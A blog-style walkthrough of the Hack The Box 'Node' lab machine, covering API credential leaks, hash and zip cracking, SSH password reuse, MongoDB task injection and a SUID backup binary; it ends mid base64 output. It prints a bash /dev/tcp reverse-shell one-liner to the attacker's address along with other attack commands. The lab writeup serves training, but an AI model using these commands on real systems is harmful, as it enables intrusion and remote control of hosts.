---
layout: post
title:  "Node Writeup - Hack The Box"
date:   2024-05-02
desc: ""
keywords: "HTB,eJPT,Linux,API,Cracking,MongoDB,BufferOverflow,Ret2libc,NX+ASLRBypass,Medium"
categories: [HTB]
tags: [HTB,eJPT,Linux,API,Cracking,MongoDB,BufferOverflow,Ret2libc,NX+ASLRBypass,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/node_writeup/Node.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I'm trapped by this thematic, the exploitation of a **Buffer Overflow** involves a lot of knowledge of various topics and drive me to research, reading and especially the comprehension, and I'm just starting! Now I chose the **Node** box from **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, classified as **medium**, but previously I already did an easy one to get into the topic slowly. I start the machine from the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform and continue with this beautiful road of **Ethical Hacking** that I'm going through.

<br /><br />
<img src="{{ site.img_path }}/node_writeup/Node_000.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start the **Enumeration** and **Reconnaissance** phase, something that I already have in mind that are the foundations of a successful pentesting or audit The communication is correct, I check this by sending an **ICMP** packet with `ping` and then with `nmap` I analyze the ports and their services that I am going to have to deal with. With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I can find the technologies that are being used in the web service that is exposed on port **3000**. And with the versions of the services that `nmap` leaks I can find with a search engine the **codename** of the Operating System of the box, if for different services I find <ins>different **codename**</ins> is a sign that I am dealing with a container.

> The **[Apache Hadoop](https://hadoop.apache.org/){:target="_blank"}** project develops open-source software for reliable, scalable, distributed computing. The Apache Hadoop software library is a framework that allows for the distributed processing of large data sets across clusters of computers using simple programming models. It is designed to scale up from single servers to thousands of machines, each offering local computation and storage. Rather than rely on hardware to deliver high-availability, the library itself is designed to detect and handle failures at the application layer, so delivering a highly-available service on top of a cluster of computers, each of which may be prone to failures.

```bash
ping -c 1 10.10.10.58
whichSystem.py 10.10.10.58
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.58 -oG allPorts
nmap -sCV -p22,3000 10.10.10.58 -oN targeted                                      # :(
nmap -sCV -p22,3000 10.10.10.58 -oN targeted -Pn
cat targeted
#    --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
#    google.es --> OpenSSH 7.2p2 4ubuntu2.2 launchpad    xenial
#    --> Apache Hadoop

whatweb http://10.10.10.58:3000
nvim Users.txt
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_001.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_002.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_003.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_004.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I access the web service from my browser, I can log in. I try some default credentials and some **SQL injections** but they don't work, I'm going to use `wfuzz` to see if I find any interesting hidden directory, but the ones I found redirect me to the home page if I want to access, and I don't find the **Forbidden** message that many times I use to keep listing directories.

```bash
# http://10.10.10.58:3000/login
#      admin:admin                      :(
#      admin' or 1=1-- -       SQLi     :(

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.58:3000/FUZZ
wfuzz -c --hc=404 --hh=3861 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.58:3000/FUZZ
#      --> uploads, assets, vendor         Redirect!
```

<br/>
<img src="{{ site.img_path }}/node_writeup/Node_005.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_006.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_007.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Something that I always forget to do, is to review the source code because I don't usually find anything (something I have to improve, <ins>**you never know where the attack can start**</ins>). But in this case I see that the web page loads some .js resources with very interesting names. If I look at their content, it looks like there is an **API** running on the server, to see all the files faster I can open the **Web Developer Tool** and navigate to the **.js** scripts.

```html
# http://10.10.10.58:3000/            [CTRL SHIFT C]

#    /api/admin/backup
#    /api/session
#    /api/users/latest
#    /api/session/authenticate
#    /api/users/

# Debugger -> Sources !!!
#    --> 10.10.10.58:3000 --> assets/js -> app -> controllers -> .js  (data leaked)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_008.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_009.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_010.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_011.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_012.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_013.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I list some **API endpoints**, some redirect me to the home page and in others I don't have the necessary permissions to see their content. I get lucky and on one it leaks me some credentials, and with `hashid` or `hash-identifier` I have an idea of what kind of hash is being used. Now I can use the **[Crackstation](https://crackstation.net/){:target="_blank"}** tool and crack the hashes, I get two passwords and I can use them to log into the page but in a superficial analysis of the dashboard it seems that it is still under development.

```bash
#http://10.10.10.58:3000/api/      Redirect!

echo "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240" | tr -d '\n' | wc -c
hashid f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
hash-identifier

curl -s -X GET http://10.10.10.58:3000/api/users/latest
curl -s -X GET http://10.10.10.58:3000/api/users/latest | jq
curl -s -X GET http://10.10.10.58:3000/api/users/latest | jq | grep "password" | awk 'NF{print $NF}' | tr -d '"' | tr -d ','

# http://10.10.10.58:3000/login       tom:spongebob       :)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_014.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_015.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_016.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_017.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_018.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_019.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_020.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_021.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I don't really know what I should do, but I'm going to continue digging into the **API**, from my console (using `curl`) I search other endpoints to see if more information is being leaked and I'm lucky, I find the admin password hash. With **[Crackstation](https://crackstation.net/){:target="_blank"}** I can break it and access the admin dashboard, now I can download a file, but I don't know if there is some security configuration in my browser or in the web server because I can't download it.

```bash
curl -s -X GET http://10.10.10.58:3000/api/login
curl -s -X GET http://10.10.10.58:3000/api/session
curl -s -X GET http://10.10.10.58:3000/api/session/authenticate
curl -s -X GET http://10.10.10.58:3000/api/users/
#     :)      (Hash)

curl -s -X GET http://10.10.10.58:3000/api/users | jq | grep "password"
curl -s -X GET "http://10.10.10.58:3000/api/users/" | jq | grep "password" | grep -oP '"\w{64}"' | tr -d '"'
curl -s -X GET http://10.10.10.58:3000/api/users | jq | grep "password" | grep -oP '"\w{64}"' | tr -d '"' | xclip -sel clip

# http://10.10.10.58:3000/login       myP14ceAdm1nAcc0uNT:manchester
#        download backup!!!      Failed!
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_022.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_023.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_024.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_025.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_026.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I think I will be able to download the file using `burpsuite`, so I capture the requests to the server and with this information with `curl` I can download the file directly from console. If I see the content, it looks a lot like **Base64** encoding but I have problems decoding it from my **`zsh`** so I try a **`bash`** and I get the decoded text. Now I can use `file` to know the file type and I am in front of a **.zip** file, with `7z` I can see its content but I can't unzip it because I need a password.

```bash
burpsuite &>/dev/null & disown

curl -s -X GET http://10.10.10.58:3000/api/admin/backup -H "Cookie: connect.sid=s%3AG4So_tC52ZKJl0wg5hIi6dFGkH7g-M2s.QQsUQUMukvwJI%2F2dfp4opqYsqa7M62NcZdo9%2FulDRlA" -o backup
file backup
cat backup
cat backup | base64 -d > data
file data
#  --> zip file

unzip data                        # :(
mv data data.zip
unzip data.zip                    # :(

bash
cat backup | xclip -sel clip
echo "..." | base64 -d > data.zip

file data.zip
7z l data.zip
7z x data.zip
#  :(    Password?
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_027.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_028.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_029.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_030.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_031.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_032.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `fcrackzip` I try and successfully get the password of the zip file and unzip it. It is the **"/var/www"** directory, which seems to be a backup of the website. If I enumerate a bit I find the most sensitive files and in one of them I find credentials to access the **MongoDB** database. If I try to access ssh and authenticate with this password I find it, it is reusing the password, a very bad practice.

```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt data.zip
#    --> magicword
7z x data.zip

cd var
# Enumerate

tree -fas -L 2
tree -fas -L 3
cat ./www/myplace/app.js               # Credentials!

ssh mark@10.10.10.58                   # Password Reuse!    :(

sshpass -p "5AYRft73VtFpc84k" ssh mark@10.10.10.58

whoami
hostname
hostname -I
export TERM=xterm
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_033.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_034.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_035.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_036.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_037.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I use my favorite system enumeration commands, and already with the first one I find a file with the **SUID** bit active but unfortunately I don't have execution permissions, only the **root** user and those who belong to the **admin** group. But I remember, from the **Reconnaissance** phase some information related to the **[MongoDB](https://www.mongodb.com/company/what-is-mongodb){:target="_blank"}** database, I investigate about the default port it opens when it is active (**27017**) and it is open. I also appeal to **[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb){:target="_blank"}** to access and search for information but I am not authorized as the user **`mark`**. Something I found with `netstat`, apart from the **MongoDB daemon**, is that `node` is running two very striking scripts, because one is in the website resources folder, very suspicious!

> **MongoDB** is a document database with the scalability and flexibility that you want with the querying and indexing that you need.


```bash
find \-perm -4000 2>/dev/null
#  --> ./usr/local/bin/backup
ls -l ./usr/local/bin/backup
#      --> Group admin!

file ./usr/local/bin/backup
#  --> ELF 32-bit

./usr/local/bin/backup
#    --> Permission denied    :(

id
groups
netstat -nat
ps -faux
ps -fawwx
#    --> /usr/bin/mongod
#    --> /var/scheduler/app.js
#    --> /var/www/myplace/app.js

mongo 127.0.0.1:27017
    /> show dbs             # :(

mongo 127.0.0.1:27017 -u mark -p 5AYRft73VtFpc84k
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_038.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_039.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_040.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_041.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_042.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_043.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I am going to investigate the script that `node` executes, analyzing it a little, it is a task whose main function is to access the documents of the **`task`** collection in the **MongoDB** database and then load them in a array to execute them (roughly). I access again to **MongoDB**, confirm again that I can't list databases and **[insert a document](https://www.geeksforgeeks.org/mongodb-insert-method-db-collection-insert/){:target="_blank"}** with its corresponding **key** and **value** but I don't get any response (I'm looking for a way to execute commands to make a user pivot), I try with another function (**insert**) but I still don't succeed. I look at the script again and it turns out that I am using the wrong key (**task1** <--> **cmd**) name and I can already execute commands as the user **`tom`** (after deleting all the erroneously loaded documents).

> **[db.collection.insertOne()](https://www.mongodb.com/docs/){:target="_blank"}**: To insert a single document, use the insertOne() method. This method inserts a single object into the database.

> **[db.collection.insert()](https://www.mongodb.com/docs/manual/crud/){:target="_blank"}**: this method is used to insert a new document in a collection.

```bash
cd $(dirname /var/scheduler/app.js)
cat app.js
#    --> db.collection('tasks') ....
##   -->    console.log('Executing task ' + doc._id  ....

mongo scheduler -u mark -p 5AYRft73VtFpc84k
    /> show dbs             # :(

mongo -u mark -p 5AYRft73VtFpc84k scheduler
    /> show dbs             # :(
    /> show collections
    /> db.tasks.find()
    /> db.tasks.insert({"task1": "whoami > /tmp/output"})
    /> exit

cd /tmp
ls                          # ?? :(

mongo scheduler -u mark -p 5AYRft73VtFpc84k
    /> db.tasks.find()
    /> db.tasks.insert({"task2": "whoami >/tmp/output2"})
    /> db.tasks.find()
    /> exit

cd /tmp
ls                          # ?? :(

cat /var/scheduler/app.js
mongo scheduler -u mark -p 5AYRft73VtFpc84k
    /> db.tasks.find()
    /> db.tasks.insert({"cmd": "whoami > /tmp/output3"})
    /> db.tasks.find()     #     :)
    /> exit

ls -l /tmp                  # :( ??

mongo scheduler -u mark -p 5AYRft73VtFpc84k
   /> db.tasks.find()
   /> db.tasks.remove()
   /> db.tasks.find()          :(
   /> db.tasks.remove({})
   /> db.tasks.find()          :)
   /> db.tasks.insert({"cmd": "whoami > /tmp/output"})
   /> exit

ls -l /tmp                  # :)
cat output.txt
# --> tom
```

<br/>
<img src="{{ site.img_path }}/node_writeup/Node_044.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_045.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_046.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_047.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_048.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_049.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The next step is to access the victim machine as the **`tom`** user, for that I first verify the connectivity with my attacker machine by sending an **ICMP** packet with `ping` and everything flows correctly and I will use a one liner from **[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** to get ***Reverse Shell***. Once I access I'm going to do a **Console treatment** to move it better and then I can already access the first flag to demonstrate the compromise of the box.

> **Attacker Machine:**

```bash
tcpdump -i tun0 icmp -n
```

> **Victime Machine:**

```bash
mongo scheduler -u mark -p 5AYRft73VtFpc84k
    /> db.tasks.find()
    /> db.tasks.insert({"cmd": "ping -c 1 10.10.14.16"})
    /> db.tasks.find()
```

> **Attacker Machine:**

```bash
nc -nlvp 443
```

> **Victime Machine:**

```bash
    /> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'"})
    #    ---> reverse shell!!

whoami
# --> tom

# Console treatment
script /dev/null -c bash
[Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_050.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_051.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_052.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_053.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I am back to continue my research about the `backup` binary with the **SUID** bit active, and I have the ability to run it since I belong to the **admin** group. If I do a test run I don't see any output on screen, with `ltrace` I don't find much information but with `strace` I see that maybe it is waiting for one or more arguments. If I search for files belonging to the **admin** group but I only get the `backup` binary  as a result. But I remember the scripts that `node` executes in background and in one of them I find very relevant information that leaks me the amount of arguments that I must pass to the binary. Now I succeed in executing it successfully.

```bash
groups
id
./usr/local/bin/backup
which ltrace
which strace
ltrace ./usr/local/bin/backup             # :( I don't get much information
strace ./usr/local/bin/backup

find \-group admin 2>/dev/null
find \-user admin 2>/dev/null             # admin is not a System's user!

ps -fawwx
cat /var/www/myplace/app.js
#    --> app.get('/api/admin/backup', function (req, res) {
#    --> var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);      <-- Three arguments

./usr/local/bin/backup one two three          :)
```

<br/>
<img src="{{ site.img_path }}/node_writeup/Node_054.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_055.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_056.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_057.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_058.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_059.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I run the binary with `ltrace` and I do a little reverse engineering, the first thing I see are the different values with which it is making a comparison with the parameters that I pass it. The second argument is apparently done with a key, and also if I open the file where it looks for them, I find a list of keys that are the correct ones. I also think I recognize a blacklist of values for the third parameter. After several tests and correcting some of my mistakes, I succeed in executing the program and get an error message indicating that the third argument must be a path.

```bash
ltrace ./usr/local/bin/backup one two three
#    --> strcmp("a", "-q")
#    --> fopen("/etc/myplace/keys", "r")

cat /etc/myplace/keys

./usr/local/bin/backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 three
./usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 three
./usr/local/bin/backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 three
# ?? :(

ltrace ./usr/local/bin/backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 three
ls -a /tmp                # ??

ltrace ./usr/local/bin/backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 three
ls -a /tmp                # ??

./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 three
 #                        --> The target path doesn't exist        :)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_060.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_061.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_062.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_063.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/node_writeup/Node_064.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_065.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_066.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_067.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try passing the path of the `tom` user's home and it generates a string, which has all the appearance of being **Base64** encoded, but it is very large, so I try with the `tmp` directory and when I save and decode the file, I get the directory I pass as the third argument, a backup is being made ( that is why the name **`:)`** ). But if I try to backup the `root` directory, it seems that the blacklist I saw in the debugging of the binary is serving its purpose and won't let me do it, not even if I resort to **[HackTricks - Bypass Linux Restrictions](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions){:target="_blank"}** to try bypassing.

```bash
./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /tmp

echo "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" | base64 -d > data

file data
#  --> Zip archive data
unzip data
ls ./tmp                    # :)

./usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /root

echo UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdx